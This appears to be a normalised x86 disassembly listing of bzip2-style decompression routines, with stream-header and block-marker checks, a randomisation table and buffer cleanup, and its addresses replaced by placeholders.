mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
shr ecx 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc54 ]
movzx eax [ eax + ecx ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x38 ]
shl ecx 0x2
and ecx 0x4
shr eax cl
and eax 0xf
shl eax 0x10
or edx eax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
movzx ecx [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x3c ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
sub eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] eax
mov edx [ ebp + 0x8 ]
xor eax eax
cmp [ edx + 0x14 ] 0x1
sete al
movzx ecx [ ebp - 0x1 ]
xor ecx eax
mov [ ebp - 0x1 ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x440 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x440 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xfa40 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x440 ] eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax * 4 + rw-data ]
mov [ ecx + 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x18 ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x200
jne r-xdata
movzx edx [ ebp - 0x1 ]
mov eax [ ebp + 0x8 ]
cmp edx [ eax + 0x3c ]
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x18 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0x444
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
push edx
call sub_40aa70
add esp 0x8
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc50 ]
movzx edx [ eax + ecx * 2 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
shr ecx 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc54 ]
movzx eax [ eax + ecx ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x38 ]
shl ecx 0x2
and ecx 0x4
shr eax cl
and eax 0xf
shl eax 0x10
or edx eax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
movzx ecx [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x3c ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
sub eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] eax
mov edx [ ebp + 0x8 ]
xor eax eax
cmp [ edx + 0x14 ] 0x1
sete al
movzx ecx [ ebp - 0x1 ]
xor ecx eax
mov [ ebp - 0x1 ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x440 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x440 ] eax
movzx edx [ ebp - 0x1 ]
add edx 0x4
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc ] edx
mov ecx [ ebp + 0x8 ]
add ecx 0x444
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x38 ]
push eax
call sub_40aa70
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x3c ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x38 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc50 ]
movzx eax [ edx + eax * 2 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
shr edx 0x1
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc54 ]
movzx edx [ ecx + edx ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x38 ]
shl ecx 0x2
and ecx 0x4
shr edx cl
and edx 0xf
shl edx 0x10
or eax edx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x38 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax * 4 + rw-data ]
mov [ ecx + 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x18 ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x200
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
cmp [ ecx + 0x14 ] 0x1
sete dl
mov eax [ ebp + 0x8 ]
xor edx [ eax + 0x3c ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x3c ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x440 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x440 ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx * 4 + rw-data ]
mov [ eax + 0x14 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x18 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x18 ] eax
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x18 ] 0x200
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x18 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x18 ] 0x0
sub_40c0c0
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
cmp eax [ ebp + 0x8 ]
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0xc4c ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0xc50 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0xc4c ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x2c ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x28 ]
call ecx
add esp 0x8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc54 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0xc50 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x2c ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x28 ]
call edx
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x2c ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x28 ]
call eax
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x20 ] 0x0
xor eax eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0xc54 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x2c ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x28 ]
call eax
add esp 0x8
sub_40c1c0
push ebp
mov ebp esp
sub esp 0x15c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0xd8 ] eax
push esi
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ebp - 0x44 ] ecx
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x4 ] 0xa
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xfa14 ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xfa18 ]
mov [ ebp - 0x74 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xfa1c ]
mov [ ebp - 0x6c ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xfa20 ]
mov [ ebp - 0x38 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xfa24 ]
mov [ ebp - 0x68 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xfa28 ]
mov [ ebp - 0x64 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xfa2c ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xfa30 ]
mov [ ebp - 0x60 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xfa34 ]
mov [ ebp - 0x70 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xfa38 ]
mov [ ebp - 0x34 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xfa3c ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xfa40 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xfa44 ]
mov [ ebp - 0x30 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xfa48 ]
mov [ ebp - 0x50 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xfa4c ]
mov [ ebp - 0x28 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xfa50 ]
mov [ ebp - 0x54 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xfa54 ]
mov [ ebp - 0x4c ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xfa58 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xfa5c ]
mov [ ebp - 0x24 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xfa60 ]
mov [ ebp - 0x48 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xfa64 ]
mov [ ebp - 0x40 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xfa68 ]
mov [ ebp - 0x2c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xfa6c ]
mov [ ebp - 0x5c ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xfa70 ]
mov [ ebp - 0x58 ] edx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x15c ] ecx
mov edx [ ebp - 0x15c ]
sub edx 0xa
mov [ ebp - 0x15c ] edx
cmp [ ebp - 0x15c ] 0x28
ja r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0xfa14 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xfa18 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0xfa1c ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0xfa20 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xfa24 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0xfa28 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0xfa2c ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xfa30 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0xfa34 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0xfa38 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xfa3c ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0xfa40 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0xfa44 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xfa48 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0xfa4c ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0xfa50 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xfa54 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0xfa58 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0xfa5c ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xfa60 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0xfa64 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0xfa68 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xfa6c ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0xfa70 ] 0x0
mov ecx 0x1
test ecx ecx
je r-xdata
mov eax [ ebp - 0x15c ]
jmp [ eax * 4 + jump_table_410658 ]
mov edx 0x1
test edx edx
je r-xdata
push 0xfa1
call sub_40a850
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] 0xa
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0xb
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0xc
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0xd
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] 0xe
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] 0xf
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x10
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x11
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x13
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] 0x14
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x15
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x16
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x17
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x18
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] 0x19
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x1a
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x1b
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] 0x1c
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] 0x1d
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x1e
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] 0x1f
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] 0x20
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x21
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] 0x22
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] 0x23
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] 0x24
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x25
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x26
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x27
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x28
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x29
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] 0x2a
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x2b
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x2c
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x2d
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x2e
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] 0x2f
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x30
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x31
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x32
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov [ eax + 0xfa14 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x74 ]
mov [ edx + 0xfa18 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x6c ]
mov [ ecx + 0xfa1c ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x38 ]
mov [ eax + 0xfa20 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x68 ]
mov [ edx + 0xfa24 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x64 ]
mov [ ecx + 0xfa28 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x20 ]
mov [ eax + 0xfa2c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x60 ]
mov [ edx + 0xfa30 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x70 ]
mov [ ecx + 0xfa34 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x34 ]
mov [ eax + 0xfa38 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x14 ]
mov [ edx + 0xfa3c ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ ecx + 0xfa40 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x30 ]
mov [ eax + 0xfa44 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x50 ]
mov [ edx + 0xfa48 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ ecx + 0xfa4c ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x54 ]
mov [ eax + 0xfa50 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4c ]
mov [ edx + 0xfa54 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0xfa58 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x24 ]
mov [ eax + 0xfa5c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x48 ]
mov [ edx + 0xfa60 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x40 ]
mov [ ecx + 0xfa64 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x2c ]
mov [ eax + 0xfa68 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x5c ]
mov [ edx + 0xfa6c ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x58 ]
mov [ ecx + 0xfa70 ] edx
mov eax [ ebp - 0x10 ]
pop esi
mov ecx [ ebp - 0xd8 ]
xor ecx ebp
call sub_411f81
mov esp ebp
pop ebp
retn
push 0xfa2
call sub_40a850
add esp 0x4
movzx edx [ ebp - 0x39 ]
cmp edx 0x42
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x8
jl r-xdata
movzx edx [ ebp - 0x39 ]
cmp edx 0x5a
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x20 ] 0x8
jl r-xdata
movzx edx [ ebp - 0x39 ]
cmp edx 0x68
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x20 ] 0x8
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x24 ] 0x31
jl r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x20 ] 0x8
jl r-xdata
movzx edx [ ebp - 0x39 ]
cmp edx 0x17
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x8
jl r-xdata
movzx edx [ ebp - 0x39 ]
cmp edx 0x41
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x8
jl r-xdata
movzx edx [ ebp - 0x39 ]
cmp edx 0x59
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x20 ] 0x8
jl r-xdata
movzx edx [ ebp - 0x39 ]
cmp edx 0x26
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x20 ] 0x8
jl r-xdata
movzx edx [ ebp - 0x39 ]
cmp edx 0x53
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x20 ] 0x8
jl r-xdata
movzx edx [ ebp - 0x39 ]
cmp edx 0x59
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x20 ] 0x8
jl r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc58 ]
shl eax 0x8
movzx ecx [ ebp - 0x39 ]
or eax ecx
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc58 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x8
jl r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc58 ]
shl eax 0x8
movzx ecx [ ebp - 0x39 ]
or eax ecx
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc58 ] eax
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x20 ] 0x8
jl r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc58 ]
shl eax 0x8
movzx ecx [ ebp - 0x39 ]
or eax ecx
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc58 ] eax
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x20 ] 0x8
jl r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc58 ]
shl eax 0x8
movzx ecx [ ebp - 0x39 ]
or eax ecx
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc58 ] eax
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x20 ] 0x8
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x34 ] 0x0
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x20 ] 0x1
jl r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x34 ]
shl eax 0x8
movzx ecx [ ebp - 0x39 ]
or eax ecx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x8
jl r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x34 ]
shl eax 0x8
movzx ecx [ ebp - 0x39 ]
or eax ecx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x34 ] eax
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x20 ] 0x8
jl r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x34 ]
shl eax 0x8
movzx ecx [ ebp - 0x39 ]
or eax ecx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x34 ] 0x0
jge r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x20 ] 0x8
jl r-xdata
movzx ecx [ ebp - 0x39 ]
cmp ecx 0x1
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x20 ] 0x1
jl r-xdata
movzx edx [ ebp - 0x39 ]
cmp edx 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x1
jl r-xdata
cmp [ ebp - 0x68 ] 0x2
jl r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x20 ] 0x3
jl r-xdata
cmp [ ebp - 0x64 ] 0x1
jge r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x20 ] 0xf
jl r-xdata
movzx edx [ ebp - 0x39 ]
test edx edx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x1
jl r-xdata
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x20 ] 0x5
jl r-xdata
movzx ecx [ ebp - 0x39 ]
test ecx ecx
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x20 ] 0x1
jl r-xdata
movzx ecx [ ebp - 0x39 ]
test ecx ecx
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x20 ] 0x1
jl r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
cmp edx [ ebp - 0x4c ]
jl r-xdata
mov edx [ ebp - 0xc ]
shl edx 0x1
or edx [ ebp - 0x24 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x20 ] 0x1
jl r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x20 ]
cmp eax [ ebp - 0x4c ]
jl r-xdata
mov edx [ ebp - 0xc ]
shl edx 0x1
or edx [ ebp - 0x24 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x20 ] 0x1
jl r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x20 ]
cmp eax [ ebp - 0x4c ]
jl r-xdata
mov edx [ ebp - 0xc ]
shl edx 0x1
or edx [ ebp - 0x24 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x20 ] 0x1
jl r-xdata
movzx edx [ ebp - 0x39 ]
cmp edx 0x72
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x8
jl r-xdata
movzx edx [ ebp - 0x39 ]
cmp edx 0x45
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x20 ] 0x8
jl r-xdata
movzx edx [ ebp - 0x39 ]
cmp edx 0x38
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x20 ] 0x8
jl r-xdata
movzx edx [ ebp - 0x39 ]
cmp edx 0x50
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x20 ] 0x8
jl r-xdata
movzx edx [ ebp - 0x39 ]
cmp edx 0x90
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x20 ] 0x8
jl r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc5c ]
shl eax 0x8
movzx ecx [ ebp - 0x39 ]
or eax ecx
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc5c ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x8
jl r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc5c ]
shl eax 0x8
movzx ecx [ ebp - 0x39 ]
or eax ecx
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc5c ] eax
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x20 ] 0x8
jl r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc5c ]
shl eax 0x8
movzx ecx [ ebp - 0x39 ]
or eax ecx
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc5c ] eax
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x20 ] 0x8
jl r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc5c ]
shl eax 0x8
movzx ecx [ ebp - 0x39 ]
or eax ecx
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc5c ] eax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x4
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x20 ] 0x8
jl r-xdata
mov [ ebp - 0x10 ] 0xfffffffb
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x20 ]
sub ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
and eax 0xff
mov [ ebp - 0x78 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
sub edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov cl [ ebp - 0x78 ]
mov [ ebp - 0x39 ] cl
jmp r-xdata
mov [ ebp - 0x10 ] 0xfffffffb
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
and eax 0xff
mov [ ebp - 0x7c ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
sub edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov cl [ ebp - 0x7c ]
mov [ ebp - 0x39 ] cl
jmp r-xdata
mov [ ebp - 0x10 ] 0xfffffffb
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
